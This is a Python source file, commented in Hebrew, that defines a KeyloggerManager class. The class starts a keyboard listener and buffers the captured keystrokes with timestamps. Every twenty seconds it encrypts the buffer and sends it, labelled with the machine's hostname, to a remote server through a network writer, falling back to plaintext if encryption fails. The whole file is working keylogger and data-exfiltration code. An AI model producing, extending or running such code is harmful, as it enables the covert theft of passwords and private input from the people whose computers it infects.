from keylogger_service import KeyloggerService
from encryption import Encryption
from file_writer import FileWriter
import time
from datetime import datetime
import threading
import socket
from network_writer import NetworkWriter

class KeyloggerManager:

    def __init__(self,key):         #בעת יצירת מופע יש להכניס מפתח הצפנה
        self.keylogger_listener = KeyloggerService()       # נוצרים אוטומטית מופעים של ListenerKeyboard() וFileWriter()/ NetworkWriter()
        self.buffer = {}
        self.key = key
        self.writer = NetworkWriter()
        self.machine_name = socket.gethostname()
        self.copied = False
        self.running = False


    def start(self):          # פונקציה להפעלת כל תכונות הKeyloggerManager
        try:
            self.running = True
            # מתחיל האזנה למקלדת
            self.keylogger_listener.start_logging()
            # יצירת תהליכון האחראי לריצת הפונקציה get_update() הרץ במקביל לתהליכון  send_data()
            threading.Thread(target=self.get_update,daemon=True).start()
            # מתחיל תהליכון לשליחת הנתונים לשרת
            threading.Thread(target=self.send_data, daemon=True).start()
        except:
            print("starting error")



    def stop(self):
        """עוצר את הניטור ושולח את הנתונים באופן מיידי."""
        self.keylogger_listener.stop_logging()
        self.running = False  # מסמן שהמחלקה מפסיקה לפעול
        self.send_data()  # שולח את הנתונים האחרונים לשרת

    def get_update(self):                    # פונקציה הרצה בלולאה אין סופית כל פסק זמן, מקבלת את הנתונים מהמאזין ומאחסנת אותם זמנית עם חותמת זמן
        while self.running:
            time.sleep(1)
            if time.time() - self.keylogger_listener.last_time_pressed > 10:
                recent = self.keylogger_listener.get_logged_keys()
                cur_time = datetime.now().strftime("%d/%m/%y_%H:%M")
                if self.copied:
                    self.buffer = {}
                    self.copied = False
                if recent:
                    if cur_time in self.buffer:
                       self.buffer[cur_time] += recent
                    else:
                       self.buffer[cur_time] = recent

    def send_data(self):                    # פונקציה הרצה בלןלאה אין סופית כל פסק זמן, ממירה את האחסון לstr מצפינה אותו ושולחת לשרת/קובץ
        while self.running:
            time.sleep(20)
            if self.buffer:
                dic2 = self.buffer.copy()
                self.copied = True
                text = ""
                for k,v in dic2.items():
                    text += f"{k}:\n"
                    for w in v:
                        text += w
                    text += "\n"
                try:
                    encrypting_text = Encryption(text,self.key)
                    encrypted_text = encrypting_text.encrypt_text()
                    self.writer.send_data(encrypted_text,self.machine_name)
                    print("sent succesfully")

                except:
                    self.writer.send_data(text, self.machine_name)
                    print("sent succesfully")


        if self.buffer:
            text = ""
            for k, v in self.buffer.items():
                text += f"{k}:\n"
                for w in v:
                    text += w
                    text += "\n"
            try:
                encrypting_text = Encryption(text, self.key)
                encrypted_text = encrypting_text.encrypt_text()
                self.writer.send_data(encrypted_text, f"{self.machine_name}")
                print("sent succesfully")
            except:
                self.writer.send_data(text, f"{self.machine_name}")
                print("sent succesfully")













